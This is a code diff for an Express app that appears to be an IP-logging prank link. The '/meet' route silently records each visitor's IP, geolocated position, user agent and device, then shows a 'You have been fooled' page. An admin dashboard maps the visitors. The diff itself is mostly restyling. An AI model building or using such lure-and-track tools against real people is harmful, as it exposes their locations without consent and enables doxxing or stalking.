@@ -61,17 +61,16 @@ app.get('/meet', async (req, res) => {
     console.error('⚠️ Error fetching location:', err.message);
   }
 
-const visitData = {
-  visit: visits.length + 1,
-  ip,
-  location: `${locationData.city}, ${locationData.regionName}, ${locationData.country}`,
-  lat: locationData.lat,
-  lon: locationData.lon,
-  userAgent,
-  time: timestamp,
-  deviceType // <- already added in previous steps
-};
-
+  const visitData = {
+    visit: visits.length + 1,
+    ip,
+    location: `${locationData.city}, ${locationData.regionName}, ${locationData.country}`,
+    lat: locationData.lat,
+    lon: locationData.lon,
+    userAgent,
+    time: timestamp,
+    deviceType // <- already added in previous steps
+  };
 
   visits.push(visitData);
   saveVisitsDebounced();
@@ -82,9 +81,11 @@ const visitData = {
   res.send(`
     <html>
       <head><title>🎉 Gotcha!</title></head>
-      <body style="text-align:center; font-family:Arial, sans-serif;">
-        <h1>🎉 You have been fooled!! 🎉</h1>
-        <img src="${FUNKY_IMAGE_URL}" style="width:90%; max-width:500px; border-radius:10px; margin:20px 0;">
+      <body style="text-align:center; font-family:Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4;">
+        <div style="text-align:center;">
+          <h1 style="font-size:2.5rem; color:#2D3748;">🎉 You have been fooled!! 🎉</h1>
+          <img src="${FUNKY_IMAGE_URL}" style="width:100%; max-width:500px; border-radius:10px; margin:20px 0;">
+        </div>
       </body>
     </html>
   `);
@@ -109,7 +110,6 @@ app.use('/admin', (req, res, next) => {
 
 // Admin UI
 app.get('/admin', (req, res) => {
-  // Group stats
   const uniqueIPs = new Set(visits.map(v => v.ip)).size;
 
   const countryCount = {};
@@ -117,15 +117,12 @@ app.get('/admin', (req, res) => {
   const dateCount = {};
 
   visits.forEach(v => {
-    // Count countries
     const country = v.location.split(', ').pop();
     countryCount[country] = (countryCount[country] || 0) + 1;
 
-    // Count devices
     const device = v.deviceType || 'Unknown';
     deviceCount[device] = (deviceCount[device] || 0) + 1;
 
-    // Count visits by date
     const date = new Date(v.time).toISOString().split('T')[0];
     dateCount[date] = (dateCount[date] || 0) + 1;
   });
@@ -134,12 +131,12 @@ app.get('/admin', (req, res) => {
   const topDevice = Object.entries(deviceCount).sort((a, b) => b[1] - a[1])[0]?.[0] || 'Unknown';
 
   const tableRows = visits.map(v => `
-    <tr class="border-t text-sm">
-      <td class="p-2">${v.visit}</td>
-      <td class="p-2">${v.ip}</td>
-      <td class="p-2">${v.location}</td>
-      <td class="p-2">${v.deviceType || 'Unknown'}</td>
-      <td class="p-2">${new Date(v.time).toLocaleString()}</td>
+    <tr>
+      <td style="padding: 10px; text-align:center;">${v.visit}</td>
+      <td style="padding: 10px; text-align:center;">${v.ip}</td>
+      <td style="padding: 10px;">${v.location}</td>
+      <td style="padding: 10px;">${v.deviceType || 'Unknown'}</td>
+      <td style="padding: 10px; text-align:center;">${new Date(v.time).toLocaleString()}</td>
     </tr>
   `).join('');
 
@@ -152,35 +149,45 @@ app.get('/admin', (req, res) => {
       <link href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" rel="stylesheet"/>
       <script src="https://cdn.tailwindcss.com"></script>
     </head>
-    <body class="bg-gray-100 text-gray-800 p-4">
-      <h1 class="text-2xl font-bold mb-4">🌍 Visitor Analytics Dashboard</h1>
+    <body style="font-family: Arial, sans-serif; background-color: #f9fafb; padding: 20px;">
+      <h1 style="font-size:2.5rem; color:#4A5568; text-align:center;">🌍 Visitor Analytics Dashboard</h1>
 
-      <!-- Summary Cards -->
-      <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-6 text-center">
-        <div class="bg-white p-4 rounded shadow"><div class="text-xl font-semibold">${visits.length}</div><div>Total Visits</div></div>
-        <div class="bg-white p-4 rounded shadow"><div class="text-xl font-semibold">${uniqueIPs}</div><div>Unique Visitors</div></div>
-        <div class="bg-white p-4 rounded shadow"><div class="text-xl font-semibold">${topCountry}</div><div>Top Country</div></div>
-        <div class="bg-white p-4 rounded shadow"><div class="text-xl font-semibold">${topDevice}</div><div>Top Device</div></div>
+      <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; margin-top: 20px;">
+        <div style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); text-align:center;">
+          <div style="font-size:1.5rem; font-weight:bold; color:#2B6CB0;">${visits.length}</div>
+          <div style="font-size:1rem; color:#4A5568;">Total Visits</div>
+        </div>
+        <div style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); text-align:center;">
+          <div style="font-size:1.5rem; font-weight:bold; color:#2B6CB0;">${uniqueIPs}</div>
+          <div style="font-size:1rem; color:#4A5568;">Unique Visitors</div>
+        </div>
+        <div style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); text-align:center;">
+          <div style="font-size:1.5rem; font-weight:bold; color:#2B6CB0;">${topCountry}</div>
+          <div style="font-size:1rem; color:#4A5568;">Top Country</div>
+        </div>
+        <div style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); text-align:center;">
+          <div style="font-size:1.5rem; font-weight:bold; color:#2B6CB0;">${topDevice}</div>
+          <div style="font-size:1rem; color:#4A5568;">Top Device</div>
+        </div>
       </div>
 
-      <!-- Charts -->
-      <div class="grid grid-cols-1 sm:grid-cols-2 gap-6 mb-6">
-        <canvas id="countryChart" class="bg-white p-4 rounded shadow"></canvas>
-        <canvas id="deviceChart" class="bg-white p-4 rounded shadow"></canvas>
-        <canvas id="timelineChart" class="bg-white p-4 rounded shadow sm:col-span-2"></canvas>
+      <div style="margin-top: 40px;">
+        <h2 style="font-size:1.5rem; color:#4A5568;">Visitor Locations</h2>
+        <div id="map" style="height: 400px; border-radius: 8px;"></div>
       </div>
 
-      <!-- Map -->
-      <div class="mb-6">
-        <h2 class="text-lg font-bold mb-2">Visitor Locations</h2>
-        <div id="map" style="height: 300px;" class="rounded shadow"></div>
-      </div>
-
-      <!-- Table -->
-      <div class="bg-white p-4 rounded shadow overflow-x-auto">
-        <h2 class="text-lg font-bold mb-2">All Visits</h2>
-        <table class="min-w-full text-left border">
-          <thead><tr class="bg-gray-200 text-sm"><th class="p-2">#</th><th class="p-2">IP</th><th class="p-2">Location</th><th class="p-2">Device</th><th class="p-2">Time</th></tr></thead>
+      <div style="margin-top: 40px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
+        <h2 style="font-size:1.5rem; color:#4A5568;">All Visits</h2>
+        <table style="width: 100%; border-collapse: collapse;">
+          <thead style="background-color: #EDF2F7; text-align:left;">
+            <tr>
+              <th style="padding: 10px; border-bottom: 1px solid #CBD5E0;">#</th>
+              <th style="padding: 10px; border-bottom: 1px solid #CBD5E0;">IP</th>
+              <th style="padding: 10px; border-bottom: 1px solid #CBD5E0;">Location</th>
+              <th style="padding: 10px; border-bottom: 1px solid #CBD5E0;">Device</th>
+              <th style="padding: 10px; border-bottom: 1px solid #CBD5E0;">Time</th>
+            </tr>
+          </thead>
           <tbody>${tableRows}</tbody>
         </table>
       </div>
@@ -193,7 +200,7 @@ app.get('/admin', (req, res) => {
           location: v.location,
           lat: v.lat,
           lon: v.lon,
-        })))};
+        })))};  
 
         const labels1 = Object.keys(countryData);
         const data1 = Object.values(countryData);
@@ -231,7 +238,6 @@ app.get('/admin', (req, res) => {
     </html>
   `);
 });
-
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Server running at http://0.0.0.0:${PORT}`);
